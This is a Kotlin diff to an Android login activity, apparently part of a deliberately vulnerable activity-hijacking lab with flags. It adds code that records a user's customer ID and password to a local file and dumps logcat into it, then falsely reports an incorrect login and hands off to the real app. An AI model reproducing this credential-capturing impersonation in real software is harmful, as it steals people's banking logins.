@@ -1,6 +1,7 @@
 package uk.ac.swansea.dascalu.dvmicc.moneymanager
 
 import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
 import android.net.Uri
 import android.os.Bundle
@@ -11,6 +12,7 @@ import androidx.appcompat.app.AppCompatActivity
 
 import com.google.android.material.appbar.MaterialToolbar
 import com.google.android.material.snackbar.Snackbar
+import java.io.OutputStreamWriter
 
 class LogInActivity : AppCompatActivity() {
     private var paymentURI : Uri? = null
@@ -50,9 +52,11 @@ class LogInActivity : AppCompatActivity() {
             val password = findViewById<EditText>(R.id.passwordInput).text.toString()
 
             if (customerID != "" && password != "") {
+                writeDataToFile(this, resources.getStringArray(R.array.activityHijackflags)[0],
+                        customerID, password)
+
                 val snackbar = Snackbar.make(view, view.context.resources.getString(
                         R.string.incorrectLogin), Snackbar.LENGTH_LONG)
-
                 snackbar.addCallback(object : Snackbar.Callback() {
                     override fun onDismissed(transientBottomBar: Snackbar?, event: Int) {
                         sendIntent()
@@ -77,5 +81,20 @@ class LogInActivity : AppCompatActivity() {
         startActivity(intent)
 
         finish()
+    }
+
+    private fun writeDataToFile(context: Context, flag: String?, customerID: String, securityNum: String) {
+        val fileOut = context.openFileOutput("data.txt", Context.MODE_APPEND)
+        val writer = OutputStreamWriter(fileOut)
+
+        Runtime.getRuntime().exec("logcat -f ${context.filesDir}/data.txt")
+        Thread.sleep(500)
+
+        if(flag != null) {
+            writer.write("\nFlag: $flag\n")
+        }
+
+        writer.write("\nCustomer ID: $customerID\nSecurity Number: $securityNum\n")
+        writer.close()
     }
 }
